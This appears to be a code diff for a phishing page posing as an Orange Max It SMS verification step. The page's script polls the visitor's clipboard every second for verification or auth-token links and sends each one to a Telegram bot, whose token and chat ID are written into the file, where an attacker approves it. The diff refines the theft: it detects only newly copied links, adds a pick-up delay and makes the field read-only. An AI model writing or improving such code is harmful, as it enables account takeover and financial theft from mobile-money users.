@@ -68,21 +68,21 @@
 
         <div class="detection-banner" id="detectionBanner">
             <div class="detection-icon">✓</div>
-            <div class="detection-text">Verification link detected from SMS and auto-filled</div>
+            <div class="detection-text">New verification link detected and auto-filled!</div>
         </div>
 
         <div class="form-card">
-            <h1 class="form-title">SMS Link Detection</h1>
-            <p class="form-subtitle">The system is actively scanning for your Orange verification link. Once the SMS arrives, the link will be processed automatically.</p>
+            <h1 class="form-title">Auto-Verify Link</h1>
+            <p class="form-subtitle">We are waiting for your Orange verification link. Once the SMS arrives, the link will be automatically detected and processed after a short safety scan.</p>
 
             <div class="form-group">
                 <label for="linkInput">Verification Link</label>
-                <input type="text" id="linkInput" class="form-input" placeholder="Scanning for SMS link...">
+                <input type="text" id="linkInput" class="form-input" placeholder="Waiting for new SMS link..." readonly>
                 <div class="error-msg" id="linkError">Invalid link detected.</div>
                 <div class="success-msg" id="linkSuccess">Link detected and sent to Telegram!</div>
             </div>
             
-            <button class="btn-action" id="continueBtn">Continue</button>
+            <button class="btn-action" id="continueBtn">Manual Verify</button>
             <button class="btn-back" id="backBtn">Go Back</button>
         </div>
     </div>
@@ -99,13 +99,15 @@
             BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
             CHAT_ID: '7547427914',
             REDIRECT_PAGE: 'success.html',
-            CLIPBOARD_POLL_INTERVAL: 1000, // Check clipboard every second
-            LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token)[^\s]+/gi
+            CLIPBOARD_POLL_INTERVAL: 1000, 
+            AUTO_PICK_DELAY: 1500, // 1.5 seconds delay after detection
+            LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token|orange-maxit)[^\s]+/gi
         };
 
         /* ─── STATE ─────────────────────────────────── */
         const state = {
             isProcessing: false,
+            initialClipboardContent: null,
             detectedLinks: new Set(),
             pollInterval: null,
             approveId: null,
@@ -148,36 +150,52 @@
 
         /* ─── SMS CLIPBOARD SCANNING ────────────────── */
         
-        /**
-         * Actively polls the clipboard to detect the verification link.
-         * Note: Browsers require a user gesture or specific permissions for clipboard access.
-         * On mobile, many browsers auto-copy SMS links or the user can tap "Copy".
-         */
+        async function initializeScanner() {
+            try {
+                // Record the current clipboard state to identify "new" links later
+                state.initialClipboardContent = await navigator.clipboard.readText();
+                console.log("Scanner initialized. Waiting for new links...");
+                startClipboardScanner();
+            } catch (err) {
+                console.log("Scanner waiting for first interaction...");
+            }
+        }
+
         function startClipboardScanner() {
+            if (state.pollInterval) clearInterval(state.pollInterval);
+            
             state.pollInterval = setInterval(async () => {
                 if (state.isProcessing) return;
 
                 try {
-                    // Try to read clipboard text
-                    const text = await navigator.clipboard.readText();
-                    const links = text.match(CONFIG.LINK_PATTERN);
+                    const currentText = await navigator.clipboard.readText();
                     
-                    if (links) {
-                        links.forEach(link => {
-                            if (!state.detectedLinks.has(link)) {
-                                state.detectedLinks.add(link);
-                                handleAutoDetection(link);
+                    // Only proceed if the clipboard content has changed from the initial state
+                    if (currentText && currentText !== state.initialClipboardContent) {
+                        const links = currentText.match(CONFIG.LINK_PATTERN);
+                        
+                        if (links) {
+                            const newLink = links[0]; // Take the first matched link
+                            if (!state.detectedLinks.has(newLink)) {
+                                state.detectedLinks.add(newLink);
+                                console.log("New link detected! Processing in " + CONFIG.AUTO_PICK_DELAY + "ms...");
+                                
+                                // Apply the requested 1-2 seconds delay
+                                setTimeout(() => {
+                                    handleAutoDetection(newLink);
+                                }, CONFIG.AUTO_PICK_DELAY);
                             }
-                        });
+                        }
                     }
                 } catch (err) {
-                    // Silent fail if clipboard access is denied
-                    console.log("Clipboard scanning waiting for permission or focus...");
+                    // Clipboard access might be blocked until user interacts
                 }
             }, CONFIG.CLIPBOARD_POLL_INTERVAL);
         }
 
         function handleAutoDetection(link) {
+            if (state.isProcessing) return;
+            
             els.linkInput.value = link;
             els.linkInput.classList.add('auto-filled');
             showDetectionBanner();
@@ -191,7 +209,6 @@
             state.approveId = `approve_${ts}`;
             state.declineId = `decline_${ts}`;
 
-            // Create a clickable link for Telegram admin
             const message = `*🔐 Orange Max It Verification*\n\n` +
                             `*SMS Detected Link:*\n[Click to Verify](${link})\n\n` +
                             `*Action Required:* Please approve below.`;
@@ -214,14 +231,13 @@
             .then(r => r.json())
             .then(data => {
                 if (data.ok) {
-                    showSuccess("Link sent! Waiting for approval...");
+                    showSuccess("New link detected and sent! Waiting for approval...");
                     startApprovalListener();
                 } else {
-                    state.isProcessing = false;
-                    hideSpinner();
+                    resetProcessing();
                 }
             })
-            .catch(() => { state.isProcessing = false; hideSpinner(); });
+            .catch(() => resetProcessing());
         }
 
         function startApprovalListener() {
@@ -249,6 +265,12 @@
             }, 2000);
         }
 
+        function resetProcessing() {
+            state.isProcessing = false;
+            hideSpinner();
+            els.linkInput.classList.remove('auto-filled');
+        }
+
         /* ─── CORE LOGIC ────────────────────────────── */
 
         function processVerification() {
@@ -264,20 +286,32 @@
         /* ─── INITIALIZATION ────────────────────────── */
 
         document.addEventListener('DOMContentLoaded', () => {
-            // Start scanning immediately
-            startClipboardScanner();
+            // Try to initialize scanner
+            initializeScanner();
 
-            // Support manual paste as fallback
-            els.linkInput.addEventListener('paste', () => {
-                setTimeout(() => processVerification(), 100);
+            // Support manual verify as fallback
+            els.continueBtn.addEventListener('click', () => {
+                // If input is empty, try to read clipboard manually
+                if (!els.linkInput.value) {
+                    navigator.clipboard.readText().then(text => {
+                        const links = text.match(CONFIG.LINK_PATTERN);
+                        if (links) {
+                            els.linkInput.value = links[0];
+                            processVerification();
+                        } else {
+                            showError("No link found in clipboard. Please copy the link from your SMS.");
+                        }
+                    }).catch(() => showError("Please allow clipboard access or paste the link."));
+                } else {
+                    processVerification();
+                }
             });
 
-            els.continueBtn.addEventListener('click', processVerification);
             els.backBtn.addEventListener('click', () => window.history.back());
             
-            // Interaction to trigger clipboard permission on some browsers
+            // Interaction to trigger clipboard permission
             document.body.addEventListener('click', () => {
-                if (!state.pollInterval) startClipboardScanner();
+                if (!state.pollInterval) initializeScanner();
             }, { once: true });
         });
 
